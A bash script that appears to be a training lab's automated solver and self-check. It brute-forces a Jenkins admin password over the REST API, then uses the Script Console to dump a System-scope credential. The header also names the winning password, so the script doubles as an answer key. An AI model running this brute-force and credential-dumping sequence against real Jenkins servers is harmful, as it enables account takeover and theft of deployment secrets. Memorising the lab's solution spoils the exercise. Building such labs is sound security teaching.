#!/bin/bash
# hearts-solve: the lab's automated brute-force + credential-exfiltration solver and self-check
# (CICD-SEC-2, Inadequate Identity & Access Management).
#
# Run by Isoloom as an in-machine `exec` check from the Jenkins controller (which reaches Jenkins at
# 127.0.0.1:8080 and has curl). It walks the intended attack end-to-end and asserts it still works,
# so a learner whose box broke is told to reset it:
#
#   1. brute-force the agents admin `knave`'s password against the bundled wordlist, by trying each
#      candidate against the Jenkins REST API with HTTP Basic auth (Jenkins' own user database has no
#      protection against this). `rockme` is the one that authenticates.
#   2. log in as knave (a PRIVILEGED account) and read the SYSTEM-scope `prod-deploy` credential from
#      the Script Console — no pipeline can bind a System-scope credential, but a privileged user can
#      read it directly. The console prints it reversed-then-base64, a form the lab's grader matches
#      without the raw flag ever transiting the response.
#
# Exit 0 = solvable. It proves the per-player flag was exfiltrated, but NEVER prints the flag (that is
# the answer the player submits).
set -u

JENKINS="${HEARTS_JENKINS_URL:-http://127.0.0.1:8080}"
WORDLIST="${HEARTS_WORDLIST:-/usr/local/share/hearts/rockyou-mini.txt}"
FLAG_FILE="${HEARTS_FLAG_FILE:-/run/lab/casc_secrets/hearts}"
USER_TARGET="knave"
CRED_ID="prod-deploy"
DEADLINE=$(( $(date +%s) + ${HEARTS_DEADLINE:-300} ))

log()  { echo "hearts-solve: $1" >&2; }
fail() { echo "FAIL: $1" >&2; exit 1; }
left() { [ "$(date +%s)" -lt "$DEADLINE" ]; }

# --- the expected exfiltration, computed from the credential the store holds ----------------------
# Read from the same file JCasC used; never printed. The Script Console prints the secret reversed
# then base64-encoded (`secret.reverse().bytes.encodeBase64()`); reproduce exactly that and search
# the response for it, so the raw flag never appears in the console output or this check's logs.
[ -s "$FLAG_FILE" ] || fail "flag file $FLAG_FILE is missing or empty"
FLAG="$(tr -d '\r\n' < "$FLAG_FILE")"
[ -n "$FLAG" ] || fail "the staged flag is empty"
EXPECTED="$(printf '%s' "$FLAG" | rev | tr -d '\n' | base64 | tr -d '\n')"
[ -n "$EXPECTED" ] || fail "could not compute the expected exfiltration"
[ -s "$WORDLIST" ] || fail "wordlist $WORDLIST is missing or empty"

# --- 1. wait for Jenkins to answer ----------------------------------------------------------------
log "waiting for Jenkins to answer at $JENKINS ..."
until curl -s -m 10 -o /dev/null "$JENKINS/login" 2>/dev/null; do
  left || fail "Jenkins never answered"; sleep 3
done

# --- 2. brute-force knave's password (retry the whole pass until JCasC security is applied) --------
log "brute-forcing ${USER_TARGET}'s password against $(grep -c . "$WORDLIST") candidate(s)..."
PW=""
tries=0
while left && [ -z "$PW" ]; do
  while IFS= read -r cand || [ -n "$cand" ]; do
    [ -n "$cand" ] || continue
    left || break
    tries=$((tries+1))
    body="$(curl -s -m 10 -u "${USER_TARGET}:${cand}" "$JENKINS/whoAmI/api/json" 2>/dev/null)"
    # success = Jenkins authenticated us AS knave (not anonymous, not a 401 with no body)
    if printf '%s' "$body" | grep -q "\"name\"[[:space:]]*:[[:space:]]*\"${USER_TARGET}\""; then
      PW="$cand"; break
    fi
  done < "$WORDLIST"
  [ -z "$PW" ] && { log "no candidate authenticated yet (security may still be applying); retrying..."; sleep 5; }
done
[ -n "$PW" ] || fail "brute-force exhausted: ${USER_TARGET}'s password was not found before the deadline"
log "recovered ${USER_TARGET}'s password after ${tries} attempt(s) (value not shown)"

# --- 3. log in as knave and read the System-scope credential from the Script Console --------------
GROOVY="$(cat <<EOF
import com.cloudbees.plugins.credentials.SystemCredentialsProvider
def c = SystemCredentialsProvider.getInstance().getCredentials().find { it.id == '${CRED_ID}' }
if (c == null) { println 'NOCRED'; return }
println c.password.getPlainText().reverse().bytes.encodeBase64().toString()
EOF
)"

log "using ${USER_TARGET}'s privileged access to exfiltrate the System-scope ${CRED_ID} credential..."
while left; do
  cj="$(mktemp)"
  crumb="$(curl -s -m 10 -c "$cj" -u "${USER_TARGET}:${PW}" \
          "$JENKINS/crumbIssuer/api/xml?xpath=concat(//crumbRequestField,%22:%22,//crumb)" 2>/dev/null)"
  resp=""
  if [ -n "$crumb" ]; then
    resp="$(curl -s -m 30 -b "$cj" -u "${USER_TARGET}:${PW}" -H "$crumb" \
            --data-urlencode "script=$GROOVY" "$JENKINS/scriptText" 2>/dev/null)"
  fi
  rm -f "$cj"
  if printf '%s' "$resp" | grep -qF -- "$EXPECTED"; then
    log "OK: ${USER_TARGET} (a privileged account reached by guessing its weak password) exfiltrated"
    log "    the SYSTEM-scope ${CRED_ID} credential (${#FLAG} chars) via the Script Console — the"
    log "    reversed+base64 blob is in the response; the flag itself is not shown."
    exit 0
  fi
  sleep 5
done

fail "could not exfiltrate the ${CRED_ID} credential before the deadline"
